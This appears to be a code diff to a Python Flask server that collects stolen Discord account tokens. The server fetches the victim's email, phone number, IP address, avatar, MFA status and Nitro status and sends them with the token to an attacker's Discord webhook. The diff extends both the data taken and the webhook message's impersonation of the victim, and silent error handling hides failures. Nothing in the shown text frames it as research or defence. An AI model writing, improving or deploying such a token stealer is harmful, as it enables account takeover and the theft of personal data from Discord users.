@@ -3,17 +3,20 @@ from dhooks import Webhook, Embed
 import requests
 
 app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+hook = Webhook('change yo webhook')
 
 
-def send_black_embed(token, ip, phone_number, email, username, tag):
+def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url, mfa_status, nitro_status):
     embed = Embed(color=0)
     embed.set_author(name=f'{username}#{tag}')
+    embed.set_thumbnail(url=avatar_url)
     embed.add_field(name='Email', value=f'```{email}```', inline=False)
     embed.add_field(name='Phone', value=f'```{phone_number}```', inline=False)
+    embed.add_field(name='MFA Status', value=f'```{mfa_status}```', inline=False)
+    embed.add_field(name='Nitro', value=f'```{nitro_status}```', inline=False)
     embed.add_field(name='IP', value=f'```{ip}```', inline=False)
     embed.add_field(name='Token', value=f'```{token}```', inline=False)
-    hook.send(embed=embed)
+    hook.send(embed=embed, username=username, avatar_url=avatar_url)
 
 
 @app.route('/alive')
@@ -50,7 +53,11 @@ def index(token):
             tag = user_data["discriminator"]
             email = user_data.get("email", "N/A")
             phone_number = user_data.get("phone", "N/A")
-            send_black_embed(token, publicip, phone_number, email, username, tag)
+            avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
+            mfa_enabled = user_data.get("mfa_enabled", False)
+            mfa_status = "Enabled" if mfa_enabled else "Disabled"
+            nitro_status = "Yes" if user_data.get("premium_type") else "No"
+            send_black_embed(token, publicip, phone_number, email, username, tag, avatar_url, mfa_status, nitro_status)
     except:
         pass
 
